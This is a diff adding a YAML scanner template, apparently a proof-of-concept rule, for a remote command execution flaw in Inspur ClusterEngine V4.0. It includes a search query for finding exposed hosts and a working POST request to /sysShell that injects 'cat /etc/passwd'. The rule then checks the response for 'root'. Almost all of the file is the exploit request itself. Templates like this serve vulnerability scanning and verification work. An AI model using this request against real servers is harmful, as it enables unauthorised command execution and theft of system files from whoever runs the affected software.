@@ -1,0 +1,21 @@
+name: ClusterEngine V4.0 Shell cluster RCE
+manual: true
+query: body="ClusterEngine V4.0"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /sysShell
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: op=doPlease&node=cu01&command=cat /etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Remote command execution exists in Inspur clusterengine v4.0. Attackers
+    can obtain server permissions by sending special requests
+  tags: RCE
